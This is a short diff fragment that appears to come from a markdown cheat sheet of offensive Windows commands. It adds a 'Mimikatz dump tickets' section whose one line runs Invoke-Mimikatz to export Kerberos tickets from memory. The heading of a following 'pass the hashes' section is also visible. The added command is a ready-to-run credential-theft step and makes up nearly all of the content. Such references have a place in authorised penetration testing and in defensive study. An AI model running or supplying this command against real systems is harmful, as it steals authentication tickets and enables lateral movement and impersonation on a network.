@@ -1,3 +1,10 @@
+## Mimikatz dump tickets
+
+
+```
+Invoke-Mimikatz -Command '"sekurlsa::ticket /export"'
+```
+
 ## Mimikatz pass the hashes
 
 ```
